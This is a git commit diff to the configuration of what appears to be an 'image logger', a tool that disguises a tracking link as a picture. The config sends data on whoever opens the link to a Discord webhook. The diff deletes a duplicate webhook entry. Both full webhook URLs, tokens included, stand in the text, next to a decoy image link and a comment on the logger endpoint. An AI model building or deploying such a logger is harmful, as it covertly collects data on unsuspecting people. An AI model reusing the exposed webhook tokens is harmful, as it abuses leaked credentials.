442e17afea862f566741be43ae8ba57a92c73031
Leon1232343 <leonfri2012@gmail.com>
2025-05-07 13:36:17 +0200

    Update Image.py

--- api/Image.py
+++ api/Image.py
@@ -13,7 +13,6 @@ __author__ = "Leon"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1369634132870828052/T-K8H71ETAoBaxqlWg-gsZGgpBRxqpkTv57ROY8G9lrTRom_cp8xRzibsGV5XoAS31ar",
-  "webhook": "https://discord.com/api/webhooks/1369634341868535808/NxW11y9q5B0qj5OKFWM_bieoUX6sAAfBmVgoDWo2oJffhBJg11ZadfWYwSbNBA3E0fIw" ,
     "image": "https://shop.renolit.com/out/pictures/master/product/1/Grau_7155_Glatt-2_Grey_7155_Smooth-2_02.11.71.000047---809700_OS.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
